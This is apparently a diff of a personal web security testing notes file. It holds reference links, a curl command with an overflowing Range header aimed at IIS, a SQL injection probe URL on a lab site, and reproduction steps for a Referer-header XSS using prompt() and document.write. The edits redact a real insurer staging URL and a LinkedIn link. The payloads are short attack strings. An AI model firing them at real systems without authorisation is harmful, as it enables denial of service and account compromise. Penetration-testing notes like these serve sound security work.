@@ -508,8 +508,7 @@ https://www.troyhunt.com/owasp-top-10-for-net-developers-part-6/
 https://stackoverflow.com/questions/10314174/difference-between-pragma-and-cache-control-headers
 https://ma.ttias.be/remote-code-execution-via-http-request-in-iis-on-windows/
    curl -v 10.0.1.1/ -H "Host: irrelevant" -H "Range: bytes=0-18446744073709551615"  -buffer overflow command
-https://www.linkedin.com/in/kanan-sharma-3a2289146/
-
+   
 http://projects.webappsec.org/w/page/13246949/Null%20Byte%20Injection
 
 
@@ -528,12 +527,10 @@ http://testphp.vulnweb.com/artists.php?artist=1'
 
 XSS using referrer header   Parameter: Referer
 Description:
-1. Navigate to http://whsec.us/?'*prompt()*'whscheck
+1. Navigate to http://sec.us/?'*prompt()*'whscheck
 2. Go into your browser’s Developer Tools and open your Web Console
 3. Execute the following command:
-document.write(“<a/href=\”https://stg.myuhc.com/content/myuhc/en/secure/account-profile/view-doc-preferences/change-preferences-online.html?docAllType=turnoff\”>click</a>”);
+document.write(“<a/href=\”https://xyz.uhc.com/”>click</a>”);
 4. Click on newly created link
 5. Authenticate to applicaton
 6. Observe JavaScript popup
-POC:
-https://stg.myuhc.com/content/myuhc/en/secure/account-profile/view-doc-preferences/change-preferences-online.html?docAllType=turnoff
